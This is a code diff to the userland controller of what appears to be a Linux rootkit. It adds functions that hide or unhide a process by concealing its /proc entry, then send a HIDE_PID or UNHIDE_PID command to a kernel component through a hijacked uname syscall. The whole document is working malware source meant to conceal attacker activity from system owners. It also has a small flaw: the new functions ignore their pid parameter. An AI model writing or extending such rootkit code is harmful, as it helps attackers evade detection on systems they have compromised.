@@ -90,6 +90,32 @@ void unhide_file(const char *path)
 	syscall(SYS_uname, &args);
 }
 
+void hide_pid(pid_t pid)
+{
+	struct rk_args args;
+	char proc_path[64];
+
+	memset(&args, 0, sizeof(args));
+	snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
+	hide_file(proc_path);
+	args.mode = HIDE_PID;
+	args.param1 = atoi(optarg);
+	syscall(SYS_uname, &args);
+}
+
+void unhide_pid(pid_t pid)
+{
+	struct rk_args args;
+	char proc_path[64];
+
+	memset(&args, 0, sizeof(args));
+	snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
+	unhide_file(proc_path);
+	args.mode = UNHIDE_PID;
+	args.param1 = atoi(optarg);
+	syscall(SYS_uname, &args);
+}
+
 int main(int argc, char **argv)
 {
 	int c, opt_idx;
@@ -138,14 +164,10 @@ int main(int argc, char **argv)
 			unhide_file(optarg);
 			break;
 		case 6:
-			args.mode = HIDE_PID;
-			args.param1 = atoi(optarg);
-			syscall(SYS_uname, &args);
+			hide_pid(atoi(optarg));
 			break;
 		case 7:
-			args.mode = UNHIDE_PID;
-			args.param1 = atoi(optarg);
-			syscall(SYS_uname, &args);
+			unhide_pid(atoi(optarg));
 			break;
 		default:
 			break;
